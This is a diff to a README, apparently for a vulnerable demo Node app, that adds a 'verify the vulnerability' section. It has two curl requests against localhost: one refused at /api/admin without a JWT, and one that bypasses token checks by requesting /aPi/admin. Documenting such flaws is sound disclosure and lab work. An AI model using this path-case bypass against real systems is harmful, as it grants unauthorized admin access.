@@ -10,8 +10,19 @@ npm install
 node app.js
 ```
 
-# test
-``` code
-You can't access `/api/admin` path without valid JWT token
-![image](https://github.com/user-attachments/assets/103d8ad7-a71b-42d8-85f4-1ed781187098)
+# verify the vulnerability
+You can't access `/api/admin` path because we don't have any valid JWT token
+``` bash
+curl  -X $'GET' \
+    -H $'Host: localhost:1337' -H $'Upgrade-Insecure-Requests: 1' -H $'Connection: keep-alive' \
+    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36' \
+    $'http://localhost:1337/api/admin'
+```
+----
+You can bypass the token validation with following way
+```bash
+curl  -X $'GET' \
+    -H $'Host: localhost:1337' -H $'Upgrade-Insecure-Requests: 1' -H $'Connection: keep-alive' \
+    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36' \
+    $'http://localhost:1337/aPi/admin'
 ```
